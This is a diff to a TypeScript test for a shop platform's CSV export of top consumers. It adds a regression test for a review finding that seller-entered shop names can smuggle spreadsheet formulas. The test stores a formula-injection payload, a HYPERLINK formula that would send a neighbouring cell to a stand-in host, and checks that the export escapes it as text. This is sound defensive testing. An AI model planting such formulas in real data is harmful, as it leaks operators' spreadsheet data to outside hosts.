@@ -144,6 +144,14 @@ async function ownerPhoneOf(tenantId: string): Promise<string | null> {
   return rows[0]?.value ?? null;
 }
 
+async function shopSlug(tenantId: string): Promise<string | null> {
+  const { rows } = await admin.query<{ slug: string }>(
+    'SELECT slug FROM control.tenants WHERE id = $1',
+    [tenantId],
+  );
+  return rows[0]?.slug ?? null;
+}
+
 interface RevenueFigures {
   wallet: Record<string, string>;
   balance: Record<string, string>;
@@ -422,6 +430,11 @@ describeIfDatabase('the top consumers (D8-10, D8-42)', () => {
     const phone = await ownerPhoneOf(big.tenantId);
     expect(phone).not.toBeNull();
     expect(bandwidth[0]?.ownerPhone).toBe(phone);
+    // Review C's F6: a seller may type any shop name, a spreadsheet formula too.
+    await admin.query('UPDATE control.tenants SET shop_name = $2 WHERE id = $1', [
+      big.tenantId,
+      '=HYPERLINK("https://x.example/?p="&C2,"Fashion")',
+    ]);
 
     const csv = await getBinary(
       port,
@@ -433,6 +446,11 @@ describeIfDatabase('the top consumers (D8-10, D8-42)', () => {
     const rows = csv.body.toString('utf8').slice(1).split('\n');
     expect(rows[0]).toBe('shop,address,owner_phone,sms_units');
     expect(rows.slice(1).some((row) => row.includes(`,${phone ?? 'none'},30`))).toBe(true);
+    // The name reaches the operator's spreadsheet as text, never a formula it runs (review C, F6).
+    const slug = (await shopSlug(big.tenantId)) ?? '';
+    expect(rows[1]).toBe(
+      `"'=HYPERLINK(""https://x.example/?p=""&C2,""Fashion"")",${slug},${phone ?? ''},30`,
+    );
     // D8-46: and a total.
     expect(rows.at(-1)).toBe('total,,,40');
     expect(csv.headers['content-disposition']).toContain(
